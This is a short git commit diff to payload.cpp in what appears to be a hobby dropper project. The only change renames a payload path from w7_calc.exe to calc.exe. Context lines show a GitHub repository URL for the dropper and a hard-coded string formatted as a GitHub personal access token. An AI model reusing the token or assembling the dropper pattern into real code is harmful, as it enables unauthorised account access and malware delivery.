69e42f93dddb064288f6c44f923c82eb19d4fb84
Adi <adindeshpande@gmail.com>
2026-07-28 16:57:39 -0500

    updated the path

--- Linux_mint_22.3/FileSystem_exe_rebuild/payload/payload.cpp
+++ Linux_mint_22.3/FileSystem_exe_rebuild/payload/payload.cpp
@@ -35,7 +35,7 @@ int main()
 
     const char* url = "https://github.com/Rastraktocat/Walmart-version-of-Dropper.git";
 
-    char* path = "Linux_mint_22.3//FileSystem_exe_rebuild//payload//w7_calc.exe";
+    char* path = "Linux_mint_22.3//FileSystem_exe_rebuild//payload//calc.exe";
 
     const char* token = "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";
 
